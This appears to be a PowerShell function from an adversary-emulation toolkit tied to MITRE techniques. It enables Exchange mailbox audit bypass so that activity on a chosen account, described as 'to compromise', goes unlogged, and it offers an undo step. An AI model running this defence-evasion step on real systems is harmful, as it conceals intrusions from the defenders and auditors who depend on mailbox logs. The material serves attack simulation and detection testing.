function DisableMailboxAuditing{

    mitre_details("DisableMailboxAuditing")
    
    EnterMailbox("Enter a mailbox address to disable auditing for")

    #Enter account to compromise
    $target_mailbox = $global:mailbox_address

    Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled

    $user_confirm = Read-Host -Prompt "Confirm disbaling Audit logging for this account? (yes/no)"

    if ($user_confirm -notin "No","no","N","n") {
        try {
            Write-Host "Disabling mailbox auditing for $target_mailbox ..."
            Set-MailboxAuditBypassAssociation -Identity $target_mailbox -AuditByPassEnabled $true -ErrorAction Stop
            Start-Sleep -s 60
            Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled
            Write-Host "`n[Success] Let's fly low! Successfully disabled auditing!!!" -ForegroundColor Yellow
            $allow_undo = $true
        }
        catch {
            Write-Host "`n[Error] Failed to disable auditing on mailbox $target_mailbox!!!" -ForegroundColor Red
        }      
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        Write-Host "`n"
        $user_confirm = Read-Host -Prompt '`nWould you like to re-enable logging for the account? (yes/no)'

        if ($user_confirm -notin "No","no","N","n") {
            Write-Host "`nRe-enabling mailbox auditing for $target_mailbox ..." -ForegroundColor Gray
            Set-MailboxAuditBypassAssociation -Identity $target_mailbox -AuditByPassEnabled $false
            Start-Sleep -s 60    
            Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled 
            Write-Host "`n[Undo Success] Re-enabled auditing!!!" -ForegroundColor Yellow
        }
    }
    Pause
}